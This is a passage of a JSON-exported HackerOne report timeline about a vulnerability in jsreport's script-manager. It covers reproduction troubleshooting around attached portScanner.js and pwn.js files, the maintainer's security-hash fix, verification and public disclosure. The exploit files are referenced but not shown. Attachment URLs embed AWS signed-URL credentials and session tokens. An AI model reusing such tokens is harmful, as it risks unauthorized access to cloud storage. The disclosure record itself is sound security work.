+      "id": 5451325,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNeedsMoreInfo",
+      "message": "Hi @inkz, \n\nCan you upload the actual portScanner.js file? I guess the formatting messed up and I am getting a syntax error. \n\nThanks, \n@ktistai",
+      "automated_response": false,
+      "created_at": "2019-07-29T09:32:01.886Z",
+      "updated_at": "2019-07-29T09:32:01.886Z",
+      "actor": {
+        "username": "ktistai",
+        "cleared": false,
+        "verified": false,
+        "url": "/ktistai",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 5459064,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNew",
+      "message": "Hi @ktistai,\nmy bad that I didn't attach the file! Done F542553\n",
+      "automated_response": false,
+      "created_at": "2019-07-30T01:58:27.549Z",
+      "updated_at": "2019-07-30T01:58:27.549Z",
+      "actor": {
+        "username": "ermilov",
+        "cleared": false,
+        "verified": false,
+        "url": "/ermilov",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/066/860/675cf13b580684485fa62b5e472d044d85cbccca_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 542553,
+          "filename": "portScanner.js",
+          "type": "application/javascript",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/542/553/e5739a3b6fb0074f16f4e0aca5cb4bfd26b95bf9/portScanner.js?response-content-disposition=attachment%3B%20filename%3D%22portScanner.js%22%3B%20filename%2A%3DUTF-8%27%27portScanner.js&response-content-type=application%2Fjavascript&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073320Z&X-Amz-Expires=1345&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=943a8d2cb2683889356846b41923848c2a864d61604fd39f11e4be9485da69a5"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 5459068,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@ktistai btw, I contacted the author of the module and he released the patch for script-manager\nhttps://github.com/pofider/node-script-manager/commit/ac645ab2e58785324c467e0583d7f277a7aa07b3 ",
+      "automated_response": false,
+      "created_at": "2019-07-30T02:01:06.488Z",
+      "updated_at": "2019-07-30T02:01:06.488Z",
+      "actor": {
+        "username": "ermilov",
+        "cleared": false,
+        "verified": false,
+        "url": "/ermilov",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/066/860/675cf13b580684485fa62b5e472d044d85cbccca_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 5460602,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNeedsMoreInfo",
+      "message": "Hi @inkz, \n\nI am getting this error, when the port is supposed to appear: \n\n████████ \n\nThen, when sending the request, I am getting this: \n\n██████████\n\nIt's 90% triaged, but the PWN does not get in the console. \n\nThanks, \n@ktistai",
+      "automated_response": false,
+      "created_at": "2019-07-30T09:40:17.715Z",
+      "updated_at": "2020-02-07T15:01:04.143Z",
+      "actor": {
+        "username": "ktistai",
+        "cleared": false,
+        "verified": false,
+        "url": "/ktistai",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 5460805,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNew",
+      "message": "@ktistai \nsorry, but I don't get what the screenshots mean,\nfor example this one █████████ is about sending a request to `██████████` not sure that it's related to the current issue",
+      "automated_response": false,
+      "created_at": "2019-07-30T10:26:12.474Z",
+      "updated_at": "2020-02-07T15:02:27.894Z",
+      "actor": {
+        "username": "ermilov",
+        "cleared": false,
+        "verified": false,
+        "url": "/ermilov",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/066/860/675cf13b580684485fa62b5e472d044d85cbccca_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 5467872,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNeedsMoreInfo",
+      "message": "Added the wrong screenshots, sorry about that. \n\n{F543703}\n\n{F543704}\n\nThanks, \n@Ktistai",
+      "automated_response": false,
+      "created_at": "2019-07-31T08:03:27.774Z",
+      "updated_at": "2019-07-31T08:03:27.774Z",
+      "actor": {
+        "username": "ktistai",
+        "cleared": false,
+        "verified": false,
+        "url": "/ktistai",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 543704,
+          "filename": "Screenshot_2019-07-30_at_11.37.38.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/543/704/09fed5303a62c921fcfcd739b40e81c254b1735a/Screenshot_2019-07-30_at_11.37.38.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2019-07-30_at_11.37.38.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2019-07-30_at_11.37.38.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073320Z&X-Amz-Expires=1345&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b7a4e179bbf4d5886113356d982b847b3b326ae895d8b82bb3e2d836794766e7"
+        },
+        {
+          "id": 543703,
+          "filename": "Screenshot_2019-07-30_at_11.37.44.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/543/703/e022371d80a8644e930149f99b6c93c797999e8d/Screenshot_2019-07-30_at_11.37.44.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2019-07-30_at_11.37.44.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2019-07-30_at_11.37.44.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073320Z&X-Amz-Expires=1345&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5c64386a74ebdad6baaf9674e5babf11012e01a350cf002da73cfcac8c3773f4"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 5469249,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNew",
+      "message": "@ktistai \nwell, first theory is that you didn't save `pwn.js` file, there is * near filename, ensure that pwn.js is saved, you can just hit Ctrl+S while in the pwn.js tab and try again\nif it doesn't work i'll think it through",
+      "automated_response": false,
+      "created_at": "2019-07-31T10:34:24.304Z",
+      "updated_at": "2019-07-31T10:34:24.304Z",
+      "actor": {
+        "username": "ermilov",
+        "cleared": false,
+        "verified": false,
+        "url": "/ermilov",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/066/860/675cf13b580684485fa62b5e472d044d85cbccca_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 5479080,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Hello @inkz\n\nThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nRegards,\n@ktistai",
+      "automated_response": false,
+      "created_at": "2019-08-01T11:26:42.035Z",
+      "updated_at": "2019-08-01T11:26:42.035Z",
+      "actor": {
+        "username": "ktistai",
+        "cleared": false,
+        "verified": false,
+        "url": "/ktistai",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 5479146,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2019-08-01T11:38:40.401Z",
+      "updated_at": "2019-08-01T11:38:40.401Z",
+      "additional_data": {
+        "old_severity": "High",
+        "new_severity": "High (8.0)",
+        "old_severity_id": 477709,
+        "new_severity_id": 483157
+      },
+      "actor": {
+        "username": "ktistai",
+        "cleared": false,
+        "verified": false,
+        "url": "/ktistai",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 6948482,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ExternalUserJoined",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-02-03T09:09:03.210Z",
+      "updated_at": "2020-02-03T09:09:03.210Z",
+      "actor": {
+        "username": "pofider",
+        "cleared": false,
+        "verified": false,
+        "url": "/pofider",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 6948556,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I believe this was fixed at the same time as https://hackerone.com/reports/660563.\n\nThe idea of the fix was that the scripts manager workers only accept requests with security hash that only the scripts manager knows and include in them.\n\nThe fix was already released to the users.",
+      "automated_response": false,
+      "created_at": "2020-02-03T09:15:38.289Z",
+      "updated_at": "2020-02-03T09:15:38.289Z",
+      "actor": {
+        "username": "pofider",
+        "cleared": false,
+        "verified": false,
+        "url": "/pofider",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 6948564,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ExternalUserRemoved",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-02-03T09:17:18.312Z",
+      "updated_at": "2020-02-03T09:17:18.312Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "removed_user": {
+        "url": "/pofider",
+        "username": "pofider"
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 6957805,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@ermilov @ktistai can you confirm this vulnerability has been fixed properly? Then I could proceed with disclosure. Thanks!",
+      "automated_response": false,
+      "created_at": "2020-02-04T09:14:15.692Z",
+      "updated_at": "2020-02-04T09:14:15.692Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 6957855,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@marcinhoppe ok, I'll check it soon.",
+      "automated_response": false,
+      "created_at": "2020-02-04T09:16:38.084Z",
+      "updated_at": "2020-02-04T09:16:38.084Z",
+      "actor": {
+        "username": "ermilov",
+        "cleared": false,
+        "verified": false,
+        "url": "/ermilov",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/066/860/675cf13b580684485fa62b5e472d044d85cbccca_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 6977205,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@ermilov were you able to verify if the issue was fixed, too?",
+      "automated_response": false,
+      "created_at": "2020-02-06T09:30:35.109Z",
+      "updated_at": "2020-02-06T09:30:35.109Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 6978293,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@marcinhoppe Yes, I verify that the issue is no longer present in the new version of the `jsreport`.\nSorry for the delay again.",
+      "automated_response": false,
+      "created_at": "2020-02-06T12:23:02.319Z",
+      "updated_at": "2020-02-06T12:23:02.319Z",
+      "actor": {
+        "username": "ermilov",
+        "cleared": false,
+        "verified": false,
+        "url": "/ermilov",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/066/860/675cf13b580684485fa62b5e472d044d85cbccca_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 6985204,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks. I will disclose this vulnerability now.",
+      "automated_response": false,
+      "created_at": "2020-02-07T08:56:29.431Z",
+      "updated_at": "2020-02-07T08:56:29.431Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 6985205,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-02-07T08:56:40.510Z",
+      "updated_at": "2020-02-07T08:56:40.510Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "ermilov",
+        "url": "/ermilov"
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 6985206,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-02-07T08:56:46.432Z",
+      "updated_at": "2020-02-07T08:56:46.432Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 6986963,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-02-07T12:15:01.490Z",
+      "updated_at": "2020-02-07T12:15:01.490Z",
+      "actor": {
+        "username": "ermilov",
+        "cleared": false,
+        "verified": false,
+        "url": "/ermilov",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/066/860/675cf13b580684485fa62b5e472d044d85cbccca_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 6986964,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-02-07T12:15:01.536Z",
+      "updated_at": "2020-02-07T12:15:01.536Z",
+      "actor": {
+        "username": "ermilov",
+        "cleared": false,
+        "verified": false,
+        "url": "/ermilov",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/066/860/675cf13b580684485fa62b5e472d044d85cbccca_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 6988486,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-02-07T15:23:15.643Z",
+      "updated_at": "2020-02-07T15:23:15.643Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "markerparker",
+        "cleared": false,
+        "verified": false,
+        "url": "/markerparker",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": true
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 6988495,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ManuallyDisclosed",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-02-07T15:24:08.699Z",
+      "updated_at": "2020-02-07T15:24:08.699Z",
+      "actor": {
+        "username": "markerparker",
+        "cleared": false,
+        "verified": false,
+        "url": "/markerparker",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": true
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
